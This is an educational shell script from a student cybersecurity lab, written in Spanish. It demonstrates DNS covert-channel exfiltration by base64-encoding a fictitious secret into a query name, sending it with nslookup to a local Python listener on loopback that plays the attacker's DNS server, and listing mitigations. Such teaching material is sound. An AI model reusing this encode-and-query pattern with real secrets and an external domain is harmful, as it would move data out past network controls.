#!/bin/sh
set -e

echo "=================================================================="
echo " LABORATORIO DE CIBERSEGURIDAD — IU DIGITAL DE ANTIOQUIA"
echo " Estudiante: Mariluz David Martínez"
echo " Módulo 04: Demostración de Exfiltración por Canal Encubierto DNS"
echo "=================================================================="

# Dato estrictamente ficticio y educativo
DATOS_FICTICIOS="clave_ficticia_demo_2026"
DATOS_CODIFICADOS=$(echo -n "$DATOS_FICTICIOS" | base64 | tr -d '=')
DOMINIO_SIMULADO="lab.dmz.local"
FQDN_PAYLOAD="${DATOS_CODIFICADOS}.${DOMINIO_SIMULADO}"

echo "[AUDITORÍA DE AISLAMIENTO] Verificando aislamiento de red Docker (internal: true)..."
echo "  - La red privada lab-dmz-net no posee enrutamiento hacia Internet."
echo "  - Se previene cualquier reenvío recursivo hacia resolvedores DNS públicos externos."
echo ""
echo "[CONCEPTO] Técnica de exfiltración de datos vía DNS (T1048.003 - MITRE ATT&CK):"
echo "  1. Dato sensible simulado: '$DATOS_FICTICIOS'"
echo "  2. Codificación Base64 sin padding: '$DATOS_CODIFICADOS'"
echo "  3. Construcción del FQDN malicioso: '$FQDN_PAYLOAD'"
echo ""

echo "[SIMULACIÓN CONTROLADA] Levantando receptor DNS local simulado en loopback..."
# Script Python ligero para emular el servidor DNS del atacante que recibe el payload
python3 -c "
import socket, sys

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.bind(('127.0.0.1', 1053))
sock.settimeout(3.0)

print('[DNS-SINKHOLE] Servidor DNS simulado a la escucha en 127.0.0.1:1053...')
try:
    data, addr = sock.recvfrom(512)
    # Extraer la consulta QNAME del paquete DNS
    qname = ''
    i = 12
    while i < len(data) and data[i] != 0:
        length = data[i]
        qname += data[i+1:i+1+length].decode('latin1', errors='ignore') + '.'
        i += 1 + length
    print(f'[CAPTURA FORENSE] Consulta DNS interceptada desde {addr}:')
    print(f'   -> QNAME Recibido: {qname}')
    print(f'   -> Payload Decodificado: {qname.split(\".\")[0]}')
except Exception as e:
    print(f'[DNS-SINKHOLE] Timeout o fin de escucha: {e}')
" &
DNS_PID=$!
sleep 1

# Enviar consulta DNS de prueba directamente al receptor interno simulado
echo "[DNS QUERY] Enviando consulta A para $FQDN_PAYLOAD al receptor local (127.0.0.1:1053)..."
nslookup -port=1053 "$FQDN_PAYLOAD" 127.0.0.1 2>&1 || true

wait $DNS_PID 2>/dev/null || true

echo ""
echo "=================================================================="
echo " [ANÁLISIS FORENSE] Evidencia de Fuga y Prevención:"
echo "   - La consulta viajó estrictamente dentro del contenedor y la red aislada."
echo "   - El payload fue capturado en el QNAME sin tocar la infraestructura pública."
echo "   - Mitigaciones: Inspección de DPI para DNS, bloqueo de túneles y DNSSEC."
echo "=================================================================="

# Si se ejecuta en modo standalone para pruebas automatizadas, finalizar aquí
if [ "$STANDALONE" = "true" ]; then
  exit 0
fi

cat <<EOF > /app/index.html
<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>Módulo 04 - Exfiltración DNS</title></head>
<body style="font-family: sans-serif; background: #0f172a; color: #f8fafc; padding: 2rem;">
  <h2>Módulo 04: Demostración de Exfiltración DNS (Canal Encubierto)</h2>
  <p>Estudiante: Mariluz David Martínez - IU Digital</p>
  <p>Estado: Simulación completada en entorno cerrado (sin tráfico externo).</p>
</body>
</html>
EOF

exec python3 -m http.server 8080
